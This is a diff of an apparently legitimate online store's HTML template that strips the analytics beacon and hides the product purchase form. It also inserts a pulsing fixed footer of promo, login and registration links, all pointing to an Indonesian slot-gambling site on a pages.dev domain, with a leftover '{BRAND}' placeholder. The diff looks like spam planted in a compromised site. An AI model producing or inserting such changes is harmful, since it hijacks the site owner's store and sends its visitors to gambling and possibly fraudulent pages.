-<script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"version":"2024.11.0","token":"dd01bbf293ef4274aaada02ab52ad77c","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
+        @media screen and (max-width: 749px) {
+            .brand--logo {
+                margin-right: 39px;
+            }
+        }
+
+        div .product-form>form.form {
+            display: none;
+        }
+
+        .shopify-policy__title h1 {
+            margin-top: 75px;
+        }
+
+        table.tbl-content {
+            table-layout: fixed;
+            border-collapse: collapse;
+            font-size: 1.4rem;
+            border-style: hidden;
+            border-top: 0.1rem solid rgba(var(--color-foreground), 0.2);
+            border-right: 0.1rem solid rgba(var(--color-foreground), 0.2);
+            border-left: 0.1rem solid rgba(var(--color-foreground), 0.2);
+            border-bottom: 0.1rem solid rgba(var(--color-foreground), 0.2);
+        }
+
+        table.tbl-content td,
+        table.tbl-content th {
+            padding: 1em;
+            border: 0.1rem solid rgba(var(--color-foreground), 0.2);
+        }
+
+        .rte ul,
+        .rte ol {
+            list-style-position: outside;
+        }
+
+        .shopify-policy__container {
+            max-width: 125ch;
+        }
+
+        .shopify-policy__body table.tbl-content td,
+        table.tbl-content th {
+            font-size: 16px;
+        }
+
+        .shopify-policy__body table.tbl-content td span.cite,
+        table.tbl-content th span.cite {
+            font-size: 12px;
+        }
+
+        /*applecare learn more pop up*/
+        .modal .ac-modal {
+            display: flex !important;
+            flex-direction: column;
+        }
+
+        .apple-care-modal__heading {
+            order: 1;
+            margin-bottom: 30px;
+        }
+
+        .modal .media.media--transparent.ratio {
+            width: 100% !important;
+            height: 110px !important;
+            order: 0;
+        }
+
+        .modal .media.media--transparent.ratio img {
+            width: 110px !important;
+            height: auto !important;
+            position: relative !important;
+        }
+
+        .apple-care-modal__content {
+            order: 2;
+        }
+
+        /*end applecare learn more pop up*/
+    </style>
+    <style>
+        :root {
+            --footer-bg: rgba(10, 10, 20, 0.9);
+            --footer-text: #f0f0f0;
+            --footer-hover: #ff9900;
+            --footer-border: rgba(255, 255, 255, 0.1);
+            --brand: #0072ff;
+            --brand-mid: #ff9900;
+            --brand-dark: #001f4d;
+            --glow: #ff9900;
+        }
+
+        /* === Base Style === */
+        .rasido-fixed-footer {
+            display: flex;
+            justify-content: space-around;
+            align-items: center;
+            position: fixed;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            z-index: 99;
+            padding: 6px 0;
+            background: linear-gradient(to bottom, #ff0800 0%, #a5290d 50%, #ff6600 100%);
+            backdrop-filter: blur(10px);
+            border-top: 1px solid var(--footer-border);
+            box-shadow: 0 -3px 15px rgba(0, 0, 0, 0.5);
+            font-family: "Poppins", sans-serif;
+            height: 52px;
+            animation: fadeInUp 0.6s ease forwards;
+        }
+
+        /* Fade-in animation */
+        @keyframes fadeInUp {
+            0% {
+                transform: translateY(50%);
+                opacity: 0;
+            }
+
+            100% {
+                transform: translateY(0);
+                opacity: 1;
+            }
+        }
+
+        /* === Link Item === */
+        .rasido-fixed-footer a {
+            flex: 1;
+            text-decoration: none;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            color: var(--footer-text);
+            font-size: 11px;
+            transition: all 0.3s ease;
+            max-width: 65px;
+            line-height: 1.1;
+            letter-spacing: 0.3px;
+            position: relative;
+        }
+
+        .rasido-fixed-footer a .icon {
+            width: 24px;
+            height: 24px;
+            margin-bottom: 3px;
+            display: block;
+            transition: transform 0.3s ease, filter 0.3s ease;
+            filter: drop-shadow(0 0 2px rgba(255, 255, 255, 0.15));
+        }
+
+        /* Hover Effects */
+        .rasido-fixed-footer a:hover {
+            color: #f8cd0b;
+            transform: translateY(-2px) scale(1.05);
+        }
+
+        .rasido-fixed-footer a:hover .icon {
+            transform: scale(1.25) rotate(-5deg);
+            filter: drop-shadow(0 0 8px var(--glow));
+        }
+
+        /* === Highlighted Button (DAFTAR) === */
+        .rasido-fixed-footer .tada {
+            background: linear-gradient(to bottom, #ff0800 0%, #a5290d 50%, #ff6600 100%);
+            border-radius: 12px;
+            padding: 5px 10px;
+            transform: scale(1.05);
+            box-shadow: 0 0 10px rgba(255, 0, 140, 0.45);
+            animation: pulseGlow 2s infinite ease-in-out;
+        }
+
+        @keyframes pulseGlow {
+
+            0%,
+            100% {
+                box-shadow: 0 0 8px rgba(255, 0, 140, 0.4);
+            }
+
+            50% {
+                box-shadow: 0 0 16px rgba(255, 0, 140, 0.4);
+                transform: scale(1.08);
+            }
+        }
+
+        .rasido-fixed-footer .tada .icon {
+            width: 25px;
+            height: 25px;
+            filter: drop-shadow(0 0 4px rgba(255, 255, 255, 0.8));
+        }
+
+        .rasido-fixed-footer .tada:hover {
+            transform: scale(1.12);
+            background: linear-gradient(to bottom, #ff0800 0%, #a5290d 50%, #ff6600 100%);
+            box-shadow: 0 0 16px rgb(255, 0, 0);
+            color: #f8cd0b;
+        }
+
+        /* === Responsive === */
+        @media (max-width: 600px) {
+            .rasido-fixed-footer {
+                height: 46px;
+                padding: 4px 0;
+            }
+
+            .rasido-fixed-footer a {
+                font-size: 9.5px;
+                max-width: 55px;
+            }
+
+            .rasido-fixed-footer a .icon {
+                width: 20px;
+                height: 20px;
+            }
+        }
+
+        /* Reduce motion for accessibility */
+        @media (prefers-reduced-motion: reduce) {
+
+            .rasido-fixed-footer,
+            .rasido-fixed-footer a,
+            .rasido-fixed-footer .icon,
+            .rasido-fixed-footer .tada {
+                transition: none;
+                animation: none;
+            }
+        }
+    </style>
+
+    <!-- === FOOTER MENU === -->
+    <div class="rasido-fixed-footer" role="navigation" aria-label="Menu bawah {BRAND}">
+        <a href="https://qrisni0day7.pages.dev/" target="_blank" aria-label="Promo {BRAND}">
+          <img class="promo-icon" layout="intrinsic" height="20px" width="20px" src="https://imgstore.io/images/2025/02/25/promo-new-OLXTOTO.Official.webp"
+            alt="PROMO SLOT">
+            PROMO
+        </a>
+
+        <a href="https://qrisni0day7.pages.dev/" target="_blank"
+            aria-label="Login {BRAND}">
+          <img class="login-icon" layout="intrinsic" height="20px" width="20px" src="https://imgstore.io/images/2025/02/25/login-new-OLXTOTO.Official.webp"
+            alt="LOGIN SLOT">
+            LOGIN
+        </a>
+
+        <a href="https://qrisni0day7.pages.dev/" target="_blank" class="tada" aria-label="Daftar {BRAND}">
+        <img class="live-chat-icon" layout="intrinsic" height="20px" width="20px" src="https://imgstore.io/images/2025/02/25/daftar-new-OLXTOTO.Official.webp"
+            alt="DAFTAR SLOT">
+            DAFTAR
+        </a>
+
+        <a href="https://qrisni0day7.pages.dev/" target="_blank" aria-label="Link alternatif {BRAND}">
+           <img class="link-icon" layout="intrinsic" height="20px" width="20px" src="https://imgstore.io/images/2025/02/25/link-new-OLXTOTO.official.webp"
+            alt="LINK SLOT">
+            LINK
+        </a>
+
+        <a href="https://qrisni0day7.pages.dev/" target="_blank" aria-label="Live chat {BRAND}">
+            <img class="live-chat-icon" layout="intrinsic" height="20px" width="20px" src="https://imgstore.io/images/2025/02/25/livechat-new-OLXTOTO.Official.webp"
+            alt="LIVE CHAT SLOT">
+            LIVE CHAT
+        </a>
+    </div>
 </body>
+
 </html>
